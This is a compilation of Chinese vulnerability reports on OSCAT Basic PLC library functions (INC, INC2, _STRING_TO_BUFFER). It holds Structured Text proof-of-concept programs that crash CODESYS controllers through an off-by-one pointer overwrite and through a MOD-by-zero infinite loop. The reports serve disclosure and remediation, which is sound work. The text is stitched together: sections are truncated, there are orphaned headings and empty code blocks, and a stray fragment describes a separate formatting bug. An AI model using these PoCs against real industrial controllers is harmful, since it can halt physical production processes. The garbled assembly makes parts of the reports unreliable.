漏洞分析报告：Division by Zero 导致的非预期逻辑死锁及拒绝服务 (CWE-369 / CWE-835 / CWE-400)
漏洞类型：Division by Zero (CWE-369)

1.摘要：在对工业控制系统广泛使用的开源组件库 OSCAT Basic 进行安全审计时，发现其 INC2 函数存在一处严重的边界校验缺失漏洞。当外部输入参数（如上界 U 和下界 L）被恶意构造为 U < L（例如 U = L - 1）时，会导致内部运算发生除数为零（MOD 0）的非法操作。在现代工业软 PLC 运行时（如 CODESYS Control Win V3 / Linux SL）中，该异常会被底层静默拦截并强制返回常量。此静默失败会毒化调用该函数的工业控制逻辑，导致依赖该函数进行状态流转的标准业务代码（如轮询、步进控制）陷入无限循环。这将在极短时间内触发 PLC 的系统级看门狗超时（Watchdog Timeout），强制控制器进入 EXCEPTION 停机状态，最终造成针对物理生产过程的拒绝服务攻击（DoS）。

2.漏洞详情
2.1 缺陷代码位置
tmp := U - L + 1;
INC2 := (X + D - L + tmp) MOD tmp + L;

2.2根因分析
INC2 函数被设计为在给定的上下界 [L, U] 范围内执行带偏移量的循环递增运算。然而，函数入口未对 L 和 U 的合法性进行有效校验。
	
	除零触发： 当攻击者或外部异常数据（如来自 HMI、上位机配方或 Modbus 报文）传入 U < L（例如 U = -1, L = 0）时，计算 tmp := U - L + 1 将导致 tmp = 0。随后执行 MOD tmp 即触发对零取模的非法算术操作。
	
	底层静默： 在现代工业级运行时环境中（如 CODESYS V3 架构），为了防止单一指令直接导致操作系统崩溃，底层运行时会捕获此异常（如拦截 SIGFPE 信号），并将结果静默置为 0。
	
	逻辑退化与死锁： 此时 (X + D - L + tmp) MOD 0 变为 0，最终 INC2 的返回值恒定为 0 + L，即常量 L。这使得 INC2 完全丧失递增功能。在工控软件中，该函数常被用于推进 WHILE 循环、FOR 循环或状态机，函数返回值的固化将导致控制流永远无法满足跳出条件，引发死循环（CWE-835）。

	漏洞分析报告：OSCAT Basic 库 _STRING_TO_BUFFER 函数越界写入导致的拒绝服务漏洞
	漏洞类型： Out-of-bounds Write (CWE-787) / 内存破坏导致拒绝服务 (CWE-400)
	受影响组件： OSCAT Basic 库 (版本 3.3.5.0 及之前版本)
	1. 摘要
	在对工业控制系统广泛使用的开源组件库 OSCAT Basic 进行安全审计时，发现其 _STRING_TO_BUFFER 函数存在严重的内存越界写入漏洞。该函数在将字符串复制到目标字节数组时，盲目信任外部传入的 SIZE 参数，且内部强制使用大数组指针（ARRAY[0..32767] OF BYTE）进行映射，未能校验目标缓冲区的真实物理边界。攻击者或恶意报文可通过传入超长的 SIZE 参数，迫使函数将超长字符串写入目标缓冲区之外的相邻内存区域。在工业控制系统中，这种内存破坏可被精准利用于覆盖相邻的关键指针变量。一旦被篡改的指针被业务逻辑解引用，将直接触发操作系统底层的内存访问违例（Access Violation / Segmentation Fault），迫使 PLC 控制器瞬间进入 EXCEPTION 停机状态，造成严重的生产系统拒绝服务（DoS）。
	2. 漏洞详情
	2.1 缺陷代码位置
	Structured Text
	
	FUNCTION _STRING_TO_BUFFER : INT
VAR_INPUT
    PT : POINTER TO ARRAY[0..32767] OF BYTE; // [缺陷1] 指针类型定义过于宽泛，映射了巨大内存
    SIZE : UINT; // [缺陷2] 盲目信任调用者输入的 SIZE，作为写入上限
END_VAR
// ...
end := MIN(pos + LEN(str), UINT_TO_INT(size)); // 仅根据输入 SIZE 和字符串长度截断
FOR i := pos TO end DO
    pt^[i] := ps^; // [缺陷3] 循环拷贝时，无真实缓冲区边界检查
    // ...
END_FOR;
	2.2 根因分析
	该漏洞的根本原因在于输入验证缺失与不安全的内存映射。在软 PLC 的应用层编程中，开发者通常只分配几十个字节的微型 Buffer，但通过 ADR() 取址传给 _STRING_TO_BUFFER 后，该函数内部统一按 32767 字节的巨大数组处理。此时，决定写入多少字节的唯一依据变成了用户输入的 SIZE 参数。若输入 SIZE 大于缓冲区的真实大小（SIZEOF(Buffer)），FOR 循环将毫无阻拦地越界踩踏后续内存，引发 CWE-787 越界写入。

	环境准备： 安装 CODESYS V3.5 SP21 Patch 3，下载并导入 oscat_basic 3.3.5.0 库。添加设备 CODESYS Control Win V3 x64 或 CODESYS Control for Linux SL。

	4. 影响评估
	在真实的工业控制场景（OT 环境）中，该漏洞构成极其致命的威胁：
		• 毁灭性的系统宕机 (System DoS)： 工控软件中广泛使用结构体与指针进行内存映射。攻击者通过上位机、HMI 协议或恶意下发的配方数据，输入构造好的超长字符串，即可利用此越界写入漏洞精准击毁相邻的内存指针或系统栈帧。这将直接触发底层的硬件/操作系统级中断（Access Violation），导致 PLC 在毫秒级内死机。对于高可用性要求的连续生产线（如化工、电力、水处理），这意味全线非计划停机，造成巨大的经济损失甚至衍生物理灾难。
		• 隐蔽的逻辑篡改： 若未导致崩溃，攻击者亦可控制溢出长度，静默篡改相邻的温度报警阈值、安全联锁标志等关键控制变量，且现有安全监控策略难以在代码层发现异常。
	5. 修复建议
	强烈建议摒弃目前的定长泛型数组映射机制，增加严格的边界防御：
		1. 重构函数接口: 不应使用 POINTER TO ARRAY[0..32767] 这种欺骗编译器的危险写法。在 IEC 61131-3 较新标准中，应使用 VAR_IN_OUT 传递可变长数组以动态获取真实长度，或要求调用者同时显式传入目标缓冲区的真实物理容量 SIZEOF(Buffer) 并在函数内进行二次比对校验。
		2. 安全防御逻辑: 在拷贝操作执行前，强制执行取小原则：Actual_Write_Len := MIN(SIZE, SIZEOF(Buffer))，彻底杜绝溢出可能。

漏洞分析报告：OSCAT Basic 库 _STRING_TO_BUFFER 函数零长度绕过与差一错误漏洞
漏洞类型： Off-by-one Error (CWE-193) / Out-of-bounds Write (CWE-787)
受影响组件： OSCAT Basic 库 (版本 3.3.5.0 及之前版本)
1. 摘要
在对工业控制系统广泛使用的开源组件库 OSCAT Basic 进行安全审计时，发现其 _STRING_TO_BUFFER 函数存在一处严重的“差一错误”（Off-by-one Error）。当外部调用者严格约束写入长度 SIZE = 0 时，函数内部的边界计算逻辑发生失效，导致循环条件退化并强制向目标指针写入 1 个字节的数据。在工控软件开发中，SIZE=0 常被用作防御性的空操作（NO-OP）或协议解析的边界截断信号，该漏洞直接击穿了开发者的安全预期。
进一步的漏洞利用（Exploitation）分析表明，尽管在现代 64 位操作系统（如 Linux/Windows）中，单一字节的小端序篡改常受限于 4KB 内存分页保护机制而引发静默数据损坏；但当该漏洞作用于多级指针（如句柄、二维数组或链表）时，攻击者可通过覆盖二级指针的最低有效字节（LSB），使其指向内存栈中的不可控脏数据。当系统对该脏数据进行地址解引用时，将瞬间触发底层的内存访问违例（Access Violation），导致 PLC 核心控制进程完全停机，造成物理级拒绝服务（DoS）。
2. 漏洞详情
2.1 缺陷代码位置
end := MIN(pos + LEN(str), UINT_TO_INT(size));
IF end > 0 THEN end := end -1; END_IF; // [缺陷点] 当 end=0 时，此判断失效
FOR i := pos TO end DO // [缺陷点] 当 pos=0 且 end=0 时，退化为 FOR i:=0 TO 0
    pt^[i] := ps^;
    ps := ps + 1;
END_FOR;
2.2 根因分析
该漏洞的本质是 IEC 61131-3 ST 语言的循环特性与边界修正逻辑的冲突：
	1. 当用户意图不写入任何数据，传入 SIZE := 0 且 POS := 0 时，MIN 函数计算得 end := 0。
	2. 随后的修正逻辑 IF end > 0 THEN end := end -1; END_IF; 原意是为了将长度转换为从 0 开始的数组索引。但当 end 已经为 0 时，条件不满足，end 保持为 0。
	3. 程序进入循环：FOR i := 0 TO 0 DO。在 ST 语言规范中，FOR 循环包含边界值，因此该循环体会被强制执行且仅执行一次。
	4. 结果导致 STR 的首字符被不可控地写入了 PT 指向的 [0] 偏移位置，形成经典的 1-byte Off-by-one 越界写入。
3. 复现步骤
环境准备： 安装 CODESYS V3.5 SP21 Patch 3，下载并导入 oscat_basic 3.3.5.0 库。添加设备 CODESYS Control Win V3 x64 或 CODESYS Control for Linux SL。
3.1 攻击向量与高阶利用准备（双重解引用模型）
为了在现代 64 位操作系统的内存保护机制下实现稳定的崩溃，采用“多级指针攻击模型”。构建一个正常指向合法内存的二级指针（POINTER TO POINTER），利用该漏洞精准覆盖其存储地址的最低位字节（LSB）。
3.2 复现代码 (PoC)
PROGRAM PLC_PRG
VAR
    dummy_value : INT := 123;
    RealPtr : POINTER TO INT;
    TargetPtr : POINTER TO POINTER TO INT; (* 攻击目标：二级指针 *)
    
    pBuffer : POINTER TO ARRAY[0..32767] OF BYTE;
    trigger_crash : BOOL := FALSE;
END_VAR
IF trigger_crash THEN
    // 1. 初始化合法内存链：TargetPtr -> RealPtr -> dummy_value
    RealPtr := ADR(dummy_value);
    TargetPtr := ADR(RealPtr);
    
    // 2. 将存在漏洞的缓冲写入函数，直接定位于二级指针之上
    pBuffer := ADR(TargetPtr); 
    
    // 3. 触发漏洞：明确要求写入 SIZE=0 字节
    _STRING_TO_BUFFER(
        STR := 'A',   (* ASCII: 16#41 *)
        POS := 0, 
        PT := pBuffer, 
        SIZE := 0     (* 触发 Off-by-one *)
    );
    // 此时，TargetPtr 所存地址的最低有效字节(LSB)被篡改为 16#41。
    // 它已偏离 RealPtr，指向栈内未知的垃圾数据。
// 4. 引发物理崩溃 (Access Violation)
    // 第一级解引用获取垃圾数据，第二级解引用将垃圾数据作为 64 位内存地址强行访问
    TargetPtr^^ := 888; 
    
    trigger_crash := FALSE;
END_IF
3.3 测试结果与崩溃证明
将程序运行至 PLC 环境，触发 trigger_crash：
	1. 尽管业务代码明确规定了 SIZE=0，但底层指针 TargetPtr 依然遭受了 1 字节的静态篡改。
	2. 当执行 TargetPtr^^ 双重解引用时，由于底层 CPU 试图访问非法的页空间地址，直接触发硬件级页错误（Page Fault）。
	3. 运行时系统抛出 *EXCEPTION* [AccessViolation] occurred 致命日志，PLC 主任务瞬间挂起，设备状态变为 STOP（红灯），造成完全的拒绝服务攻击。






4. 影响评估
该漏洞的危险性在于其对防御逻辑的穿透能力与隐蔽的内存破坏能力：
	• 静默数据破坏 (Silent Corruption)： 在常规的一级指针或数组操作中，这 1 字节的越界可能不会立即导致崩溃（受限于操作系统的 4KB 页保护），而是篡改相邻变量的值。这种隐蔽的修改难以触发监控告警，可能导致工艺参数产生致命偏差。
	• 高危拒绝服务 (System DoS)： 如本报告 PoC 证实，一旦该函数在复杂的工业控制流（如设备句柄传递、动态数据结构解析）中作用于多级指针区域，这 1 字节的偏差即可被转化为不可信的绝对地址访问，瞬间摧毁控制器的可用性，导致全厂非计划停机。
5. 修复建议

该漏洞严重破坏了工业软件开发中对“标准数值格式”的安全假设。当该畸形数据被传递给合法的下游业务逻辑（如数字提取、查表映射）时，未被预期的负号字符将导致数组索引计算出现负偏移。这会诱使下游代码读取非法的内存指针（脏指针），进而在解引用时瞬间触发系统级的内存访问违规（Access Violation），直接迫使 PLC 控制器进入 EXCEPTION 停机状态，造成毁灭性的拒绝服务（DoS）。

2.1 缺陷代码位置
Structured Text

2.2 根本原因分析
	1. 上游整数溢出： 当 IN := -3599.0 且 N := 6 时，计算得到的 O 超出了 DINT 的最大上限，底层硬件（x64）将其回绕解释为负数。
	2. 格式毒化： DINT_TO_STRING 生成了第一个负号。随后的 IF in < 0 判定再次于字符串头部追加负号，最终产生畸形输出 '--695.966720'。

1. 摘要

2.2 根因分析
该漏洞的根本原因在于不完备的输入校验与工业运行时的内存保护机制发生碰撞：

漏洞分析报告：OSCAT Basic 库 INC 函数逻辑缺陷导致的拒绝服务漏洞
漏洞类型： Division by Zero 导致的非预期逻辑死锁及拒绝服务 (CWE-369 / CWE-835 / CWE-400)
受影响组件： OSCAT Basic 库 (版本 3.3.5.0 及之前版本)
严重程度： 高 (High) - 可导致 PLC 运行时环境看门狗超时并全面停机
1. 摘要
在对工业自动化开源组件库 OSCAT Basic 进行安全审计时，发现其 INC 函数存在一处严重的除零（MOD 0）算术逻辑漏洞。当外部输入参数 M 被恶意构造或意外设置为 -1 时，会导致内部取模运算的除数为零。在现代工业软 PLC 运行时（如 CODESYS Control Win V3 / Linux SL）中，该异常会被底层静默拦截，并强制函数恒定返回 0。此静默失败会严重毒化调用该函数的工业控制流，导致依赖该函数进行状态推进的标准业务代码（如轮询、步进或配方执行）陷入无限死循环。由于工控任务具有严格的实时性要求，这将在极短时间内（数毫秒至数秒）触发 PLC 的系统级看门狗超时（Watchdog Timeout），强制控制器进入 EXCEPTION 停机状态，最终造成针对物理生产过程的拒绝服务攻击（DoS）。
2. 漏洞详情
2.1 缺陷代码位置
缺陷位于 INC 函数内部唯一的取模运算处：
// 当 M = -1 时，(M + 1) 为 0，触发 MOD 0
INC := (X + D + M + 1) MOD (M + 1);
2.2 根因分析
INC 函数在 OSCAT 库中常用于在 [0, M] 范围内执行带步长 D 的循环递增运算。然而，函数入口未对上限界定参数 M 进行有效性校验：
	1. 除零触发： 表达式右侧的操作数（除数）为 (M + 1)。当外部传入 M = -1 时，除数计算结果为 0，从而触发对零取模的非法算术操作。
	2. 底层静默与逻辑退化： 在现代工业级运行时环境（如基于 V3 架构的软 PLC）中，为防止系统直接崩溃，底层内核捕获了此运算异常并静默返回 0。此时，无论输入变量 X（当前值）和 D（步长）为何值，INC 函数完全丧失其递增计算的语义，不可逆地退化为一个永远返回 0 的常值函数。
	3. 连锁死锁： 由于该函数通常被用作循环变量的迭代器，返回值的固化将导致外层控制回路（如 WHILE 或 REPEAT 语句）永远无法满足退出条件，从而引发 CWE-835 无限循环。
3. 复现步骤
环境准备： 安装 CODESYS V3.5 SP21 Patch 3，下载并导入 oscat_basic 3.3.5.0 库。添加设备 CODESYS Control Win V3 x64 或 CODESYS Control for Linux SL。
3.1 攻击向量准备
模拟实际工控场景中，上位机配方系统或 HMI 参数下发被篡改：
	• X := 0 (当前步数，任意值)
	• D := 1 (递增步长，任意值)
	• M := -1 (关键漏洞触发参数：导致除数为零)
3.2 复现代码 (PoC)
构造一段典型的依赖 INC 进行步进控制的业务代码片段：
PROGRAM PLC_PRG
VAR
    index : INT := 0;
    step_size : INT := 1;
    malicious_M : INT := -1; (* 模拟被外部篡改的阈值参数 *)
    trigger_vuln : BOOL := FALSE;
END_VAR
(* 模拟工控循环轮询或步进任务 *)
IF trigger_vuln THEN
    index := 0;
    (* 预期行为：index 每次增加 1，到达 10 后跳出循环 *)
    (* 实际行为：因漏洞存在，INC 永远返回 0，导致极其致命的死循环 *)
    WHILE index < 10 DO
        index := INC(X := index, D := step_size, M := malicious_M);
    END_WHILE;
    trigger_vuln := FALSE;
END_IF
3.3 测试结果与物理崩溃证明
将程序下载至运行环境，设置任务循环周期（如 10ms）与看门狗超时时间（如 2000ms）。将 trigger_vuln 置为 TRUE 后：
	1. WHILE 循环立刻陷入死锁，PLC 任务当前周期的执行时间迅速飙升。
	2. 当耗时超过设定的超时阈值后，底层监控机制介入，触发系统级看门狗超时 (Watchdog Timeout)。
	3. CODESYS 运行时抛出 *EXCEPTION* [Watchdog] occurred 的致命系统日志。
	4. 控制器被强行拉入 EXCEPTION / STOP 状态（亮红灯），所有物理 I/O 输出被立即切断，造成整机拒绝服务。




4. 影响评估
在工业自动化场景（OT 环境）中，该漏洞的威胁等级极高。攻击者无需具备篡改 PLC 梯形图或 ST 源代码的权限，只需通过暴露的工业协议接口（如 Modbus TCP、OPC UA 或 HMI 画面）向暴露的 M 变量写入畸形边界值（-1），即可“借刀杀人”。利用正常业务逻辑中对 INC 函数的调用，攻击者能瞬间拖死 PLC 的主扫描周期，引发看门狗停机。这将导致工厂流水线骤停、工艺失控，在连续制造或危化品控制场景中可能引发物理安全事故。
5. 修复建议
强烈建议在执行运算前对参数 M 增加边界防御，确保除数绝对不为零。
修复方案：
Structured Text

(* 增加防御性校验：确保除数非零 *)
IF M <> -1 THEN
    INC := (X + D + M + 1) MOD (M + 1);
ELSE
    (* 处理异常输入，避免逻辑死锁。可根据业务场景返回当前值 X *)
    INC := X; 
    (* 或触发应用程序级错误告警 *)
END_IF;
